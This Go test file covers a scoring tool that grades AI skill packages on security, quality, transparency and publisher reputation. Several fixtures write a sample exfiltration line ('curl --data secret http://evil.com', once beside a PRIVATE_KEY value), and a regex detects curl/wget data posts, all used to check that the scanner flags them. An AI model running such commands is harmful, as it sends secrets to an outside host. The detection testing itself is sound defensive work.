package skill

import (
	"math"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestVerifyWeights(t *testing.T) {
	if err := verifyWeights(); err != nil {
		t.Fatal(err)
	}
}

func TestGradeFromScore(t *testing.T) {
	tests := []struct {
		name     string
		score    float64
		expected ScoreGrade
	}{
		// Grade A: score >= 90
		{name: "score 100 is A", score: 100, expected: GradeA},
		{name: "score 95 is A", score: 95, expected: GradeA},
		{name: "score 90 boundary is A", score: 90, expected: GradeA},
		{name: "score above 100 is A", score: 150, expected: GradeA},

		// Grade B: 80 <= score < 90
		{name: "score 89.9 is B", score: 89.9, expected: GradeB},
		{name: "score 85 is B", score: 85, expected: GradeB},
		{name: "score 80 boundary is B", score: 80, expected: GradeB},

		// Grade C: 70 <= score < 80
		{name: "score 79.9 is C", score: 79.9, expected: GradeC},
		{name: "score 75 is C", score: 75, expected: GradeC},
		{name: "score 70 boundary is C", score: 70, expected: GradeC},

		// Grade D: 60 <= score < 70
		{name: "score 69.9 is D", score: 69.9, expected: GradeD},
		{name: "score 65 is D", score: 65, expected: GradeD},
		{name: "score 60 boundary is D", score: 60, expected: GradeD},

		// Grade F: score < 60
		{name: "score 59.9 is F", score: 59.9, expected: GradeF},
		{name: "score 50 is F", score: 50, expected: GradeF},
		{name: "score 0 is F", score: 0, expected: GradeF},
		{name: "negative score is F", score: -10, expected: GradeF},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := gradeFromScore(tt.score)
			if got != tt.expected {
				t.Errorf("gradeFromScore(%v) = %q, expected %q", tt.score, got, tt.expected)
			}
		})
	}
}

func TestGradeBelowThreshold(t *testing.T) {
	tests := []struct {
		name      string
		grade     ScoreGrade
		threshold ScoreGrade
		expected  bool
	}{
		// Same grade is not below threshold
		{name: "A not below A", grade: GradeA, threshold: GradeA, expected: false},
		{name: "B not below B", grade: GradeB, threshold: GradeB, expected: false},
		{name: "F not below F", grade: GradeF, threshold: GradeF, expected: false},

		// Grade is better than threshold (not below)
		{name: "A not below B", grade: GradeA, threshold: GradeB, expected: false},
		{name: "A not below F", grade: GradeA, threshold: GradeF, expected: false},
		{name: "B not below C", grade: GradeB, threshold: GradeC, expected: false},
		{name: "C not below D", grade: GradeC, threshold: GradeD, expected: false},

		// Grade is worse than threshold (below)
		{name: "B below A", grade: GradeB, threshold: GradeA, expected: true},
		{name: "C below A", grade: GradeC, threshold: GradeA, expected: true},
		{name: "D below A", grade: GradeD, threshold: GradeA, expected: true},
		{name: "F below A", grade: GradeF, threshold: GradeA, expected: true},
		{name: "F below D", grade: GradeF, threshold: GradeD, expected: true},
		{name: "C below B", grade: GradeC, threshold: GradeB, expected: true},
		{name: "D below C", grade: GradeD, threshold: GradeC, expected: true},

		// Unknown grade treated as worst (rank 5)
		{name: "unknown grade below A", grade: ScoreGrade("X"), threshold: GradeA, expected: true},
		{name: "F not below unknown", grade: GradeF, threshold: ScoreGrade("X"), expected: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := GradeBelowThreshold(tt.grade, tt.threshold)
			if got != tt.expected {
				t.Errorf("GradeBelowThreshold(%q, %q) = %v, expected %v",
					tt.grade, tt.threshold, got, tt.expected)
			}
		})
	}
}

func TestScorePublisherCategory(t *testing.T) {
	t.Run("nil publisher returns base score", func(t *testing.T) {
		cat := scorePublisherCategory(nil)
		if cat.Score != publisherBaseScore {
			t.Errorf("nil publisher score = %v, expected %v", cat.Score, publisherBaseScore)
		}
		if cat.Weight != weightPublisher {
			t.Errorf("weight = %v, expected %v", cat.Weight, weightPublisher)
		}
		if cat.Name != "Publisher" {
			t.Errorf("name = %q, expected %q", cat.Name, "Publisher")
		}
		if cat.Details != "No publisher information available (local skill)" {
			t.Errorf("unexpected details: %q", cat.Details)
		}
	})

	t.Run("org account gets org bonus", func(t *testing.T) {
		pub := &PublisherInfo{
			Owner:      "test-org",
			IsOrg:      true,
			RepoStars:  0,
			AccountAge: 0,
			HasLicense: false,
		}
		cat := scorePublisherCategory(pub)
		expectedScore := publisherBaseScore + orgBonus
		if cat.Score != expectedScore {
			t.Errorf("org score = %v, expected %v", cat.Score, expectedScore)
		}
	})

	t.Run("user account gets no org bonus", func(t *testing.T) {
		pub := &PublisherInfo{
			Owner:      "some-user",
			IsOrg:      false,
			RepoStars:  0,
			AccountAge: 0,
			HasLicense: false,
		}
		cat := scorePublisherCategory(pub)
		if cat.Score != publisherBaseScore {
			t.Errorf("user score = %v, expected %v", cat.Score, publisherBaseScore)
		}
	})

	t.Run("star bonus calculation", func(t *testing.T) {
		tests := []struct {
			name          string
			stars         int
			expectedBonus float64
		}{
			{name: "0 stars gives 0 bonus", stars: 0, expectedBonus: 0},
			{name: "50 stars gives 1 bonus", stars: 50, expectedBonus: 1},
			{name: "500 stars gives 10 bonus", stars: 500, expectedBonus: 10},
			{name: "1000 stars capped at max", stars: 1000, expectedBonus: starBonusMax},
			{name: "5000 stars capped at max", stars: 5000, expectedBonus: starBonusMax},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				pub := &PublisherInfo{
					Owner:      "user",
					RepoStars:  tt.stars,
					AccountAge: 0,
					HasLicense: false,
				}
				cat := scorePublisherCategory(pub)
				actualBonus := cat.Score - publisherBaseScore
				if math.Abs(actualBonus-tt.expectedBonus) > 0.0001 {
					t.Errorf("star bonus for %d stars = %v, expected %v",
						tt.stars, actualBonus, tt.expectedBonus)
				}
			})
		}
	})

	t.Run("account age bonus calculation", func(t *testing.T) {
		tests := []struct {
			name          string
			age           int
			expectedBonus float64
		}{
			{name: "0 years gives 0 bonus", age: 0, expectedBonus: 0},
			{name: "5 years gives 5 bonus", age: 5, expectedBonus: 5},
			{name: "10 years capped at max", age: 10, expectedBonus: accountAgeBonusMax},
			{name: "20 years capped at max", age: 20, expectedBonus: accountAgeBonusMax},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				pub := &PublisherInfo{
					Owner:      "user",
					RepoStars:  0,
					AccountAge: tt.age,
					HasLicense: false,
				}
				cat := scorePublisherCategory(pub)
				actualBonus := cat.Score - publisherBaseScore
				if math.Abs(actualBonus-tt.expectedBonus) > 0.0001 {
					t.Errorf("age bonus for %d years = %v, expected %v",
						tt.age, actualBonus, tt.expectedBonus)
				}
			})
		}
	})

	t.Run("license present adds bonus", func(t *testing.T) {
		pub := &PublisherInfo{
			Owner:      "user",
			RepoStars:  0,
			AccountAge: 0,
			HasLicense: true,
		}
		cat := scorePublisherCategory(pub)
		expectedScore := publisherBaseScore + licensePresentBonus
		if cat.Score != expectedScore {
			t.Errorf("license score = %v, expected %v", cat.Score, expectedScore)
		}
		if len(cat.Deducts) != 0 {
			t.Errorf("expected no deductions with license, got %d", len(cat.Deducts))
		}
	})

	t.Run("missing license adds deduction record", func(t *testing.T) {
		pub := &PublisherInfo{
			Owner:      "user",
			RepoStars:  0,
			AccountAge: 0,
			HasLicense: false,
		}
		cat := scorePublisherCategory(pub)
		if len(cat.Deducts) != 1 {
			t.Fatalf("expected 1 deduction, got %d", len(cat.Deducts))
		}
		if cat.Deducts[0].Points != 0 {
			t.Errorf("deduction points = %v, expected 0 (missing license is a missed bonus, not a deduction)", cat.Deducts[0].Points)
		}
	})

	t.Run("score capped at 100", func(t *testing.T) {
		// Maximize all bonuses: org + max stars + max age + license
		pub := &PublisherInfo{
			Owner:      "mega-org",
			IsOrg:      true,
			RepoStars:  100000,
			AccountAge: 50,
			HasLicense: true,
		}
		cat := scorePublisherCategory(pub)
		if cat.Score > 100 {
			t.Errorf("score %v exceeds cap of 100", cat.Score)
		}
		if cat.Score != 100 {
			t.Errorf("max publisher score = %v, expected 100", cat.Score)
		}
	})

	t.Run("all bonuses combined correctly", func(t *testing.T) {
		pub := &PublisherInfo{
			Owner:      "org-name",
			IsOrg:      true,
			RepoStars:  250,  // 250/50 = 5
			AccountAge: 3,    // 3 years
			HasLicense: true, // +5
		}
		cat := scorePublisherCategory(pub)
		expected := publisherBaseScore + orgBonus + 5.0 + 3.0 + licensePresentBonus
		if math.Abs(cat.Score-expected) > 0.0001 {
			t.Errorf("combined score = %v, expected %v", cat.Score, expected)
		}
	})

	t.Run("zero values publisher", func(t *testing.T) {
		pub := &PublisherInfo{}
		cat := scorePublisherCategory(pub)
		// No org, 0 stars, 0 age, no license = base score only
		if cat.Score != publisherBaseScore {
			t.Errorf("zero publisher score = %v, expected %v", cat.Score, publisherBaseScore)
		}
	})
}

func TestGradeRank(t *testing.T) {
	tests := []struct {
		name     string
		grade    ScoreGrade
		expected int
	}{
		{name: "A is rank 1", grade: GradeA, expected: 1},
		{name: "B is rank 2", grade: GradeB, expected: 2},
		{name: "C is rank 3", grade: GradeC, expected: 3},
		{name: "D is rank 4", grade: GradeD, expected: 4},
		{name: "F is rank 5", grade: GradeF, expected: 5},
		{name: "unknown is rank 5", grade: ScoreGrade("Z"), expected: 5},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := gradeRank(tt.grade)
			if got != tt.expected {
				t.Errorf("gradeRank(%q) = %d, expected %d", tt.grade, got, tt.expected)
			}
		})
	}
}

func TestGradeRankOrdering(t *testing.T) {
	// Verify that ranks are strictly ordered: A < B < C < D < F
	grades := []ScoreGrade{GradeA, GradeB, GradeC, GradeD, GradeF}
	for i := 0; i < len(grades)-1; i++ {
		if gradeRank(grades[i]) >= gradeRank(grades[i+1]) {
			t.Errorf("expected rank(%q) < rank(%q), got %d >= %d",
				grades[i], grades[i+1], gradeRank(grades[i]), gradeRank(grades[i+1]))
		}
	}
}

func TestGenerateSummary(t *testing.T) {
	tests := []struct {
		name     string
		grade    ScoreGrade
		contains string
	}{
		{name: "grade A summary", grade: GradeA, contains: "Excellent"},
		{name: "grade B summary", grade: GradeB, contains: "Good"},
		{name: "grade C summary", grade: GradeC, contains: "Acceptable"},
		{name: "grade D summary", grade: GradeD, contains: "Poor"},
		{name: "grade F summary", grade: GradeF, contains: "Failed"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := &ScoreResult{Grade: tt.grade}
			summary := generateSummary(result)
			if !strings.Contains(summary, tt.contains) {
				t.Errorf("generateSummary for grade %q = %q, expected to contain %q",
					tt.grade, summary, tt.contains)
			}
		})
	}
}

func TestMatchPattern(t *testing.T) {
	tests := []struct {
		name    string
		text    string
		pattern string
		match   bool
		wantErr bool
	}{
		{name: "simple match", text: "hello world", pattern: "hello", match: true},
		{name: "no match", text: "hello world", pattern: "xyz", match: false},
		{name: "regex match", text: "curl --data foo", pattern: `(?i)(curl|wget).*(-d|--data|--post)`, match: true},
		{name: "invalid regex returns error", text: "test", pattern: `[invalid`, match: false, wantErr: true},
		{name: "empty text no match", text: "", pattern: "something", match: false},
		{name: "empty pattern matches everything", text: "anything", pattern: "", match: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := matchPattern(tt.text, tt.pattern)
			if (err != nil) != tt.wantErr {
				t.Errorf("matchPattern() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if got != tt.match {
				t.Errorf("matchPattern(%q, %q) = %v, expected %v",
					tt.text, tt.pattern, got, tt.match)
			}
		})
	}
}

func TestScoreSkillIntegration(t *testing.T) {
	tmpDir := t.TempDir()

	// Create a minimal skill with SKILL.md
	skillDir := filepath.Join(tmpDir, "test-skill")
	if err := os.MkdirAll(filepath.Join(skillDir, "prompts"), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(skillDir, "SKILL.md"), []byte(`---
name: test-skill
description: A test skill
version: "1.0.0"
author: tester
---

# Test Skill

This is a test.
`), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(skillDir, "README.md"), []byte("# Test Skill\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(skillDir, "prompts", "main.md"), []byte("prompt\n"), 0644); err != nil {
		t.Fatal(err)
	}

	result, err := ScoreSkill(skillDir, nil)
	if err != nil {
		t.Fatalf("ScoreSkill returned error: %v", err)
	}

	// Verify structure
	if result.SkillName != "test-skill" {
		t.Errorf("SkillName = %q, want %q", result.SkillName, "test-skill")
	}
	if len(result.Categories) != 4 {
		t.Fatalf("expected 4 categories, got %d", len(result.Categories))
	}
	if result.TotalScore < 0 || result.TotalScore > 100 {
		t.Errorf("TotalScore = %v, expected 0-100", result.TotalScore)
	}
	if result.Grade == "" {
		t.Error("Grade is empty")
	}
	if result.Summary == "" {
		t.Error("Summary is empty")
	}

	// Verify category weights sum to 1.0
	var weightSum float64
	for _, cat := range result.Categories {
		weightSum += cat.Weight
	}
	if math.Abs(weightSum-1.0) > 0.001 {
		t.Errorf("category weights sum = %v, expected 1.0", weightSum)
	}
}

func TestScoreSecurityCategory(t *testing.T) {
	t.Run("clean skill has high score", func(t *testing.T) {
		tmpDir := t.TempDir()
		skillDir := filepath.Join(tmpDir, "clean-skill")
		if err := os.MkdirAll(skillDir, 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(skillDir, "SKILL.md"), []byte(`---
name: clean-skill
description: A clean safe skill
version: "1.0.0"
author: tester
---

# Clean Skill

This skill helps with testing.
`), 0644); err != nil {
			t.Fatal(err)
		}
		cat := scoreSecurityCategory(skillDir)
		if cat.Name != "Security" {
			t.Errorf("Name = %q, want %q", cat.Name, "Security")
		}
		if cat.Weight != weightSecurity {
			t.Errorf("Weight = %v, want %v", cat.Weight, weightSecurity)
		}
		if cat.Score < 80 {
			t.Errorf("clean skill security score = %v, want >= 80 (deductions: %+v)", cat.Score, cat.Deducts)
		}
	})

	t.Run("nonexistent dir scan succeeds with fallback name", func(t *testing.T) {
		cat := scoreSecurityCategory("/nonexistent/path/does/not/exist")
		// Even without SKILL.md, the scan runs (no files to scan = no findings)
		// The score reflects the file scan results, not metadata presence
		if cat.Score < 0 || cat.Score > 100 {
			t.Errorf("nonexistent dir security score = %v, expected 0-100", cat.Score)
		}
	})
}

func TestScoreQualityCategory(t *testing.T) {
	t.Run("complete skill scores 100", func(t *testing.T) {
		tmpDir := t.TempDir()
		skillDir := filepath.Join(tmpDir, "quality-skill")
		if err := os.MkdirAll(filepath.Join(skillDir, "prompts"), 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(skillDir, "SKILL.md"), []byte(`---
name: quality-skill
description: A quality skill
version: "1.0.0"
author: tester
---
`), 0644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(skillDir, "README.md"), []byte("# Readme\n"), 0644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(skillDir, "prompts", "main.md"), []byte("prompt\n"), 0644); err != nil {
			t.Fatal(err)
		}

		cat := scoreQualityCategory(skillDir)
		if cat.Score != 100 {
			t.Errorf("complete skill quality score = %v, want 100 (deductions: %+v)", cat.Score, cat.Deducts)
		}
	})

	t.Run("empty dir has deductions", func(t *testing.T) {
		tmpDir := t.TempDir()
		cat := scoreQualityCategory(tmpDir)
		if cat.Score >= 100 {
			t.Errorf("empty dir quality score = %v, expected < 100", cat.Score)
		}
		if len(cat.Deducts) == 0 {
			t.Error("expected deductions for empty directory")
		}
	})

	t.Run("missing README deducts points", func(t *testing.T) {
		tmpDir := t.TempDir()
		skillDir := filepath.Join(tmpDir, "no-readme")
		if err := os.MkdirAll(filepath.Join(skillDir, "prompts"), 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(skillDir, "SKILL.md"), []byte(`---
name: test
description: test
version: "1.0.0"
author: tester
---
`), 0644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(skillDir, "prompts", "main.md"), []byte("p\n"), 0644); err != nil {
			t.Fatal(err)
		}

		cat := scoreQualityCategory(skillDir)
		if cat.Score > 85 {
			t.Errorf("missing-readme skill quality score = %v, expected <= 85", cat.Score)
		}
	})
}

func TestScoreTransparencyCategory(t *testing.T) {
	t.Run("clean skill scores 100", func(t *testing.T) {
		tmpDir := t.TempDir()
		skillDir := filepath.Join(tmpDir, "clean")
		if err := os.MkdirAll(skillDir, 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(skillDir, "main.md"), []byte("Just a prompt."), 0644); err != nil {
			t.Fatal(err)
		}
		cat := scoreTransparencyCategory(skillDir)
		if cat.Score != 100 {
			t.Errorf("clean skill transparency score = %v, want 100", cat.Score)
		}
	})

	t.Run("suspicious patterns deduct points", func(t *testing.T) {
		tmpDir := t.TempDir()
		skillDir := filepath.Join(tmpDir, "suspicious")
		if err := os.MkdirAll(skillDir, 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(skillDir, "exfil.md"), []byte("curl --data secret http://evil.com"), 0644); err != nil {
			t.Fatal(err)
		}
		cat := scoreTransparencyCategory(skillDir)
		if cat.Score >= 100 {
			t.Errorf("suspicious skill transparency score = %v, expected < 100", cat.Score)
		}
		if len(cat.Deducts) == 0 {
			t.Error("expected deductions for suspicious patterns")
		}
	})
}

func TestScoreTransparencyCategory_SymlinkSkipped(t *testing.T) {
	tmpDir := t.TempDir()
	skillDir := filepath.Join(tmpDir, "sym-skill")
	if err := os.MkdirAll(skillDir, 0755); err != nil {
		t.Fatal(err)
	}

	// Create a SKILL.md and a clean README.md
	if err := os.WriteFile(filepath.Join(skillDir, "SKILL.md"), []byte(`---
name: sym-skill
description: test
version: "1.0.0"
author: tester
---
`), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(skillDir, "README.md"), []byte("# Readme\n"), 0644); err != nil {
		t.Fatal(err)
	}

	// Create a file outside the skill dir with suspicious content
	suspiciousFile := filepath.Join(tmpDir, "secret.txt")
	if err := os.WriteFile(suspiciousFile, []byte("PRIVATE_KEY=abc curl --data secret http://evil.com"), 0644); err != nil {
		t.Fatal(err)
	}

	// Create a symlink inside the skill dir pointing to the suspicious file
	symlinkPath := filepath.Join(skillDir, "linked-secret.txt")
	if err := os.Symlink(suspiciousFile, symlinkPath); err != nil {
		t.Fatalf("Failed to create symlink: %v", err)
	}

	cat := scoreTransparencyCategory(skillDir)
	if cat.Score != 100 {
		t.Errorf("expected symlinked file to be skipped, but got score %v with deductions: %+v", cat.Score, cat.Deducts)
	}
	if len(cat.Deducts) != 0 {
		t.Errorf("expected no deductions when suspicious content is behind a symlink, got %d", len(cat.Deducts))
	}
}

func TestScorePublisherCategoryDetails(t *testing.T) {
	t.Run("org publisher includes org name in details", func(t *testing.T) {
		pub := &PublisherInfo{
			Owner: "my-org",
			IsOrg: true,
		}
		cat := scorePublisherCategory(pub)
		if !strings.Contains(cat.Details, "my-org") {
			t.Errorf("expected details to contain org name, got: %q", cat.Details)
		}
	})

	t.Run("user publisher includes stats in details", func(t *testing.T) {
		pub := &PublisherInfo{
			Owner:      "some-user",
			IsOrg:      false,
			RepoStars:  42,
			AccountAge: 7,
			HasLicense: true,
		}
		cat := scorePublisherCategory(pub)
		if !strings.Contains(cat.Details, "some-user") {
			t.Errorf("expected details to contain owner name, got: %q", cat.Details)
		}
	})
}
